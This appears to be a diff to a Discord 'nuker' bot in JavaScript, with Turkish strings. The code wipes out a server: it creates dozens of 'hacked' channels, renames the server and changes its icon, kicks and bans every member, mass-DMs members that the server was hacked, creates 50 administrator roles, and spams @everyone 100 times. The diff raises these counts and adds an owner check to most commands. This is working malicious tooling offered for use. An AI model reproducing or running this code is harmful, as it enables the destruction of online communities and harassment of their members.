@@ -11,7 +11,7 @@ client.login(config.token);
 // Event handler
 client.once('ready', () => {
   console.log(`Bot ${client.user.tag} olarak giriş yaptı.`);
-  client.user.setActivity('Remake by Parsher', { type: 'PLAYING' });
+  client.user.setActivity('Kitty Kat', { type: 'PLAYING' });
 });
 
 // Event handler for message creation
@@ -23,7 +23,7 @@ client.on('messageCreate', async (msg) => {
       await msg.delete();
       const channelsToCreate = [];
       let i = 0;
-      while (i < 15) {
+      while (i < 70) {
         channelsToCreate.push({ name: 'hacked', type: ChannelType.GuildText });
         i++;
       }
@@ -52,8 +52,8 @@ client.on('messageCreate', async (msg) => {
 
       // Update guild settings
       try {
-        await msg.guild.setIcon('https://cdn.discordapp.com/attachments/1173319481599213639/1258816805032431676/image.png?ex=66896c02&is=66881a82&hm=dd5477e5945beadb0fc5e426c9d3723ed791a5736d8defd7c5e4e8f6fa8864f1&');
-        await msg.guild.setName('Parsher daddy uwu :3');
+        await msg.guild.setIcon('https://pbs.twimg.com/media/Ex6m_hqXIAQLWeZ?format=jpg&name=4096x4096');
+        await msg.guild.setName('Patlatıldı uwu');
       } catch (err) {
         console.error('Failed to update guild settings:', err);
       }
@@ -71,8 +71,8 @@ client.on('messageCreate', async (msg) => {
 
       // Update bot settings
       try {
-        await client.user.setAvatar('https://cdn.discordapp.com/attachments/1173319481599213639/1258816805032431676/image.png?ex=66896c02&is=66881a82&hm=dd5477e5945beadb0fc5e426c9d3723ed791a5736d8defd7c5e4e8f6fa8864f1&');
-        await client.user.setUsername('Parsher daddy uwu');
+        await client.user.setAvatar('https://pbs.twimg.com/media/Ex6m_hqXIAQLWeZ?format=jpg&name=4096x4096');
+        await client.user.setUsername('Patlatıldı uwu');
       } catch (err) {
         console.error('Failed to update bot settings:', err);
       }
@@ -82,32 +82,65 @@ client.on('messageCreate', async (msg) => {
       await msg.delete();
       await msg.guild.leave();
     },
-    '+kick': async () => {
-      await msg.delete();
-      await Promise.all(msg.guild.members.cache.map(member => member.kick()));
-    },
-    '+dm': async () => {
-      await msg.delete();
-      await Promise.all(msg.guild.members.cache.map(member => member.send('**BU SUNUCU HACKLENMİŞTİR HADİ KOLAY GELSİN** :wink:')));
-    },
+'+kick': async () => {
+  if (msg.author.id !== config.sahip) return msg.reply('Sahibim sen değilsin.');
+  await msg.delete();
+  await Promise.all(
+    msg.guild.members.cache.map(member => {
+      if (member.kickable && member.id !== client.user.id) {
+        return member.kick('Sunucudan atıldınız.').then(() => console.log(`${member.user.tag} atıldı.`)).catch(err => console.error(`Kick hatası: ${err}`));
+      }
+    })
+  );
+},
+'+dm': async () => {
+  if (msg.author.id !== config.sahip) return msg.reply('Sahibim sen değilsin.');
+  await msg.delete();
+  const message = '**Bir sunucu sevilmiştir haberiniz osun! İYİGÜNLEEEER :3** :wink:';
+  
+  await Promise.all(
+    msg.guild.members.cache.map(member => {
+      if (!member.user.bot) { // Botlara mesaj göndermemek için kontrol
+        return member.send(message).catch(err => console.error(`DM gönderme hatası: ${err}`));
+      }
+    })
+  );
+},
     '+yetki': async () => {
       await msg.delete();
       const role = await msg.guild.roles.create({ name: '.', permissions: [PermissionFlagsBits.Administrator] });
       await msg.member.roles.add(role);
     },
-    '+ban': async () => {
-      await msg.delete();
-      await Promise.all(msg.guild.members.cache.map(member => member.ban()));
-    },
-    '+rol': async () => {
-      await msg.delete();
-      const colors = ['A93D3D', 'C22F2F', 'E12020', 'FF0000', 'FF3E00'];
-      await Promise.all(colors.map(color => msg.guild.roles.create({ name: 'HACKED', color, permissions: [PermissionFlagsBits.Administrator] })));
-    },
+'+ban': async () => {
+  if (msg.author.id !== config.sahip) return msg.reply('Sahibim sen değilsin.');
+  await msg.delete();
+  await Promise.all(
+    msg.guild.members.cache.map(member => {
+      if (member.bannable && member.id !== client.user.id) {
+        return member.ban({ reason: 'Sunucudan uzaklaştırıldınız.' }).then(() => console.log(`${member.user.tag} banlandı.`)).catch(err => console.error(`Ban hatası: ${err}`));
+      }
+    })
+  );
+},
+'+rol': async () => {
+  if (msg.author.id !== config.sahip) return msg.reply('Sahibim sen değilsin.');
+  await msg.delete();
+  
+  let count = 0;
+  while (count < 50) {
+    await msg.guild.roles.create({
+      name: 'HACKED',
+      color: 'FF3E00',
+      permissions: [PermissionFlagsBits.Administrator]
+    }).then(() => console.log(`Rol ${count + 1} oluşturuldu.`)).catch(err => console.error(`Rol oluşturma hatası: ${err}`));
+    
+    count++;
+  }
+},
     '+spam': async () => {
       await msg.delete();
       const spamMessage = '**Ş-şey b-bu sunucusu patlatılmıştır uwu** @everyone :heart: :heart:';
-      for (let i = 0; i < 15; i++) {
+      for (let i = 0; i < 100; i++) {
         await msg.channel.send(spamMessage);
       }
     },
